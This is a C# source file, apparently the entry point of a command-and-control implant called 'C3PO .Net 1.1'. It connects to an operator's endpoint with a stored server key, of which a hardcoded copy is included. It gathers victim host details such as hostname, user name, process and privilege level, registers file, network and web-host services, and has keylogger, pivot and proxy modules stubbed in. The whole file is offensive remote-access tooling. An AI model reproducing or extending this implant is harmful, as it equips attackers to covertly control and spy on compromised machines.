using Agent.Communication;
using Agent.Models;
using Agent.Service;
using Shared;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;


namespace EntryPoint
{
    public class Entry
    {
#if DEBUG
        static string[] _args = new string[0];
#endif

        public static void Main(string[] args)
        {
#if DEBUG
            _args = args;
#endif
            try
            {
                Start().Wait();
            }
            catch (Exception ex)
            {
#if DEBUG
                Debug.WriteLine($"Ooops something went wrong : {ex}");
#endif
            }
        }

        public static async Task Start()
        {
            string connUrl = Agent.Properties.Resources.EndPoint;
            string serverKey = Agent.Properties.Resources.Key;
#if DEBUG
            Debug.Listeners.Add(new TextWriterTraceListener(Console.Out));

            if (_args.Count() > 0)
            {
                connUrl = _args[0];
                
            }

            if (_args.Count() > 1)
            {
                serverKey = _args[1];
            }
            else
            {
                serverKey = "1yOdEVXef7ljnzrRgINB27Bi4zGwi1v2B664b65hAO7elTTM";
            }

            //connUrl = "https://192.168.48.128:443";

#endif
            var connexion = ConnexionUrl.FromString(connUrl);

            Debug.WriteLine($"Endpoint is {connUrl}.");
            Debug.WriteLine($"ServerKey is {serverKey}.");

            if (!connexion.IsValid)
            {
                Debug.WriteLine($"Endpoint {connUrl} is not valid, quiting...");
                return;
            }

            var metaData = GenerateMetadata(connexion.ToString());


            var configService = new ConfigService();
            configService.ServerKey = serverKey;

            ServiceProvider.RegisterSingleton<IConfigService>(configService);
            ServiceProvider.RegisterSingleton<INetworkService>(new NetworkService());
            ServiceProvider.RegisterSingleton<IFileService>(new FileService());
            ServiceProvider.RegisterSingleton<IWebHostService>(new WebHostService());

            //ServiceProvider.RegisterSingleton<IProxyService>(new ProxyService());
            //ServiceProvider.RegisterSingleton<IPivotService>(new PivotService());
            //ServiceProvider.RegisterSingleton<IKeyLogService>(new KeyLogService());

            
            var commModule = CommunicationFactory.CreateEgressCommunicator(connexion);
            var agent = new Agent.Agent(metaData, commModule);


            var s_agentThread = new Thread(agent.Run);
            s_agentThread.Start();
            s_agentThread.Join();


           

#if DEBUG
            Debug.WriteLine("Bye !");
#endif
        }


        static AgentMetadata GenerateMetadata(string endpoint)
        {
            var process = Process.GetCurrentProcess();
            var userName = Environment.UserName;

            string integrity = "Medium";
            if (userName == "SYSTEM")
                integrity = "SYSTEM";

            using (var identity = WindowsIdentity.GetCurrent())
            {
                if (identity.User != identity.Owner)
                {
                    integrity = "High";
                }
            }

            AgentMetadata metadata = new AgentMetadata()
            {
                Id = Agent.ShortGuid.NewGuid(),
                Hostname = Environment.MachineName,
                UserName = userName,
                ProcessId = process.Id,
                ProcessName = process.ProcessName,
                Architecture = IntPtr.Size == 8 ? "x64" : "x86",
                Integrity = integrity,
                EndPoint = endpoint,
                Version = "C3PO .Net 1.1",
                SleepInterval = endpoint.ToLower().StartsWith("http") ? 2 : 0, //pivoting agent
                SleepJitter = 0
            };

            return metadata;
        }
    }
}
